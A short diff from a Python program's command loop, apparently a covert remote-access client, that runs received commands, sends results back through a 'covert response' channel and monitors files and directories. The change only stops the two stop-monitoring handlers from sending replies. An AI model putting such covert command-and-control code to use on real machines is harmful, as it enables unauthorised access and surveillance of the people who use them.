@@ -609,13 +609,13 @@ def main():
             cmd_to_run = command_str.split(":", 1)[1]
             result = run_program(cmd_to_run)
             send_covert_response(result.encode())
+
         elif command_str.startswith("CMD_STOP_MON_DIR"):
-            result = stop_monitor_directory()
-            send_covert_response(result.encode())
+            stop_monitor_directory()
 
         elif command_str.startswith("CMD_STOP_MON_FILE"):
-            result = stop_monitor_file()
-            send_covert_response(result.encode())
+            stop_monitor_file()
+
         elif command_str.startswith("CMD_FETCH_EVENTS"):
             with data_lock:
                 events = mon_file_events + mon_dir_events
